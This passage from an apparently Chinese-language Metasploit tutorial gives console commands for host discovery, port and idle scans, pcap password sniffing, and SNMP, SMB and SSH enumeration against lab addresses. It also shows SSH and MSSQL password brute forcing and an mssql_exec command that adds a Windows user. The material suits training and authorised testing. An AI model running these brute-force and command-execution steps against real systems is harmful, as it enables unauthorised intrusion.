r><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line">信息收集</span><br><span class="line">	</span><br><span class="line">信息收集的模块都在 auxiliary/scanner/ 之下</span><br><span class="line">tab  tab</span><br><span class="line"></span><br><span class="line">Auxiliary 扫描模块</span><br><span class="line">主机发现</span><br><span class="line">use anxiliary/scanner/discovery/arp_sweep</span><br><span class="line">set INTERFACE  eth0</span><br><span class="line">set RHOSTS  192.168.47.0/24</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">nmap -v - sv 192.168.47.237</span><br><span class="line"></span><br><span class="line">search portscan </span><br><span class="line">端口扫描</span><br><span class="line">use auxiliary/scanner/portscan/syn    </span><br><span class="line">show options</span><br><span class="line">set INTERFACE  eth0          网卡</span><br><span class="line">set PORTS 445                端口            </span><br><span class="line">set RHOSTS 192.168.47.0/24   地址</span><br><span class="line">set THREADS 100              线程</span><br><span class="line">run</span><br><span class="line">quit</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/portscan/tcp   </span><br><span class="line">show options</span><br><span class="line">set RHOSTS  192.168.47.131</span><br><span class="line">set THREADS 10</span><br><span class="line">run</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">db_nmap</span><br><span class="line"></span><br><span class="line">跟 nmap 用法一样，结果存放在 msf 的数据库中</span><br><span class="line"></span><br><span class="line">msf &gt; db_nmap -sV 10.10.10.0/24</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nmap -sP 192.168.47.0/24</span><br><span class="line"></span><br><span class="line">僵尸扫描</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查找 ipidseq 主机（查找僵尸机）</span><br><span class="line"></span><br><span class="line">    use auxiliary/scanner/ip/ipidseq</span><br><span class="line">    set RHOSTS 192.168.1.0/24 ；run</span><br><span class="line">    nmap -PN -sI 10.10.10.147 10.10.10.132</span><br><span class="line">    msf &gt; use auxiliary/scanner/ip/ipidseq</span><br><span class="line">    msf auxiliary(scanner/ip/ipidseq) &gt; show options </span><br><span class="line">    msf auxiliary(scanner/ip/ipidseq) &gt; set RHOSTS 10.10.10.100-150</span><br><span class="line">    msf auxiliary(scanner/ip/ipidseq) &gt; set THREADS 20</span><br><span class="line">    msf auxiliary(scanner/ip/ipidseq) &gt; run</span><br><span class="line">      </span><br><span class="line">  db_nmap -PN -sI 192.168.47.2 192.168.47.131</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">udp_sweep</span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line">msf auxiliary(scanner/discovery/udp_sweep) &gt; show options </span><br><span class="line">msf auxiliary(scanner/discovery/udp_sweep) &gt; set RHOSTS 192.168.47.100-192.168.47.150</span><br><span class="line">msf auxiliary(scanner/discovery/udp_sweep) &gt; run</span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/discovery/udp_probe </span><br><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; show options </span><br><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; set RHOSTS 10.10.10.100-150 </span><br><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; set CHOST 10.10.10.131 </span><br><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; set THREADS 20 </span><br><span class="line">msf auxiliary(scanner/discovery/udp_probe) &gt; run</span><br><span class="line"></span><br><span class="line">密码嗅探</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">支持从 pacap 抓包文件中提取密码</span><br><span class="line">功能类似于 dsniff</span><br><span class="line">目前只支持 pop3、imap、ftp、HTTP GET 协议</span><br><span class="line">msf &gt; search sniffer</span><br><span class="line">msf &gt; use auxiliary/sniffer/psnuffle</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; show options </span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; set INTERFACE eth0</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; run</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; show options</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; set PCAPFILE /root/ftp.pcapng</span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; jobs </span><br><span class="line">msf auxiliary(sniffer/psnuffle) &gt; kill 0 msf auxiliary(sniffer/psnuffle) &gt; run</span><br><span class="line"></span><br><span class="line">SNMP 扫描</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vim /etc/snmp/snmpd.conf （侦听复制修改为 0.0.0.0：161）</span><br><span class="line">use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/snmp/snmp_enumusers （windows）</span><br><span class="line">use auxiliary/scanner/snmp/snmp_enumshares （windows）</span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_login</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_login) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_login) &gt; set RHOSTS 10.10.10.149</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_login) &gt; set THREADS 20</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_login) &gt; run</span><br><span class="line">    1</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.149</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; run</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enum</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.142 （windows）</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; run</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; set COMMUNITY jlcssadmin （SNMP 服务器团体名）</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; set THREADS 20</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enum) &gt; run</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enumusers</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set COMMUNITY jlcssadmin</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set RHOSTS 10.10.10.142</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</span><br><span class="line">   </span><br><span class="line">msf &gt; use auxiliary/scanner/snmp/snmp_enumshares</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options </span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set COMMUNITY jlcssadmin</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set RHOSTS 10.10.10.142</span><br><span class="line">msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</span><br><span class="line"></span><br><span class="line">SMB 扫描</span><br><span class="line"></span><br><span class="line">SMB 扫描</span><br><span class="line">SMB 版本扫描</span><br><span class="line">    use auxiliary/scanner/smb/smb_version</span><br><span class="line"></span><br><span class="line">扫描命令管道。判断 SMB 服务类型（账号、密码）</span><br><span class="line">    use auxiliary/scanner/smb/pipe_auditor</span><br><span class="line"></span><br><span class="line">扫描通过 SMB 管道可以访问的 RCERPC 服务</span><br><span class="line">    use auxiliary/scanner/smb/pipe_dcerpc_auditor</span><br><span class="line"></span><br><span class="line">SMB 共享账号（账号、密码）</span><br><span class="line">    use auxiliary/scanner/smb/smb_enumshares</span><br><span class="line"></span><br><span class="line">SMB 用户枚举（账号、密码）</span><br><span class="line">    use auxiliary/scanner/smb/smb_enumusers</span><br><span class="line"></span><br><span class="line">SID 枚举（账号、密码）</span><br><span class="line">    use auxiliary/scanner/smb/smb_lookupsid</span><br><span class="line"></span><br><span class="line">SSH 扫描</span><br><span class="line"></span><br><span class="line">SSH 版本扫描</span><br><span class="line"></span><br><span class="line">    use auxiliary/scanner/ssh/ssh_version</span><br><span class="line"></span><br><span class="line">SSH 密码爆破</span><br><span class="line"></span><br><span class="line">    use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">        set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt ；set VERBOSE false ；run</span><br><span class="line"></span><br><span class="line">SSH 公钥登陆</span><br><span class="line"></span><br><span class="line">    use auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">        set KEY_FILE id_rsa；set USERNAME root ；run</span><br><span class="line"></span><br><span class="line">SSH 版本扫描</span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 10.10.10.132</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_version) &gt; run</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">SSH 密码爆破</span><br><span class="line"></span><br><span class="line">root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt </span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.132</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; set VERBOSE false </span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line">#设置账号</span><br><span class="line">set USERNAME root</span><br><span class="line">#设置账号文件</span><br><span class="line">set USER_FILE 密码文件</span><br><span class="line">#设置密码</span><br><span class="line">set PASSWORD 123456</span><br><span class="line">#设置密码文件</span><br><span class="line">set PASS_FILE 密码文件</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">SSH 公钥登陆</span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set RHOSTS 10.10.10.132</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set USERNAME root</span><br><span class="line">msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</span><br><span class="line"></span><br><span class="line">windows 缺少的补丁</span><br><span class="line"></span><br><span class="line">use post/windows/gather/enum_patches</span><br><span class="line">background</span><br><span class="line"></span><br><span class="line">mssql 扫描</span><br><span class="line"></span><br><span class="line">mssql 扫描端口</span><br><span class="line">    TCP 1422（动态端口）/ UDP 1434 （查询 TCP 端口号）</span><br><span class="line">    use auxiliary/scanner/mssql/mssql_ping</span><br><span class="line"></span><br><span class="line">爆破 mssql 密码</span><br><span class="line">    use auxiliary/scanner/mssql/mssql_login</span><br><span class="line"></span><br><span class="line">远程执行代码（获取数据库权限之后）</span><br><span class="line">    use auxiliary/admin/mssql/mssql_exec</span><br><span class="line">    set CMD net user user1 pass123 /ADD</span><br><span class="line"></span><br><span class="line">mssql 扫描端口</span><br><span class="line"></span><br><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping</span><br><span class="line">msf auxiliary(scanner/mssql/mssql_ping) &gt; set RHOSTS 10.10.10.142</span><br><span class="line">msf auxiliary(scanner/mssql/mssql_ping) &gt; run</span><br><span class="line"></span><br><span class="line">FTP 扫描</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/ [tab]</span><br><span class="line">    Display all 479 possibilities? (y or n)</span><br><span class="line"></span><br><span class="line">查询版本信息</span><br><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">       </span><br><span class="line">是否允许匿名登录</span><br><span class="line">msf &gt; use auxiliary/scanner/ftp/anonymous</span><br><span class="line">  </span><br><span class="line">暴力破解</span><br><span class="line">use auxiliary/scanner/ftp/ftp_login</span><br></pre></td></tr></table></figure>
